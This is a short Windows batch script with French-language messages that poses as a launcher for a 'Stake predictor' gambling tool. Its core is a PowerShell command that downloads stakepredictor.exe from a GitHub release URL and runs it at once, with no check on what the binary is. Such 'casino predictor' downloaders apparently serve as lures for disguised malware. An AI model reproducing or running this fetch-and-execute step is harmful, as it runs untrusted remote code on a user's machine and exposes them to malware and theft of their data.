@echo off
echo Veuillez patienter, le predictor se lance...
timeout /t 3 >nul

mkdir predictor_temp
cd predictor_temp

echo Téléchargement en cours...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/stakepredictor-2025/stake-predictor/releases/download/stakepredictor/stakepredictor.exe', 'stakepredictor.exe')"


if exist "stakepredictor.exe" (
    echo Installation terminée. Lancement...
    start stakepredictor.exe
) else (
    echo Erreur: Le fichier n'a pas pu être téléchargé.
)


cd ..
rem rmdir /s /q predictor_temp

exit
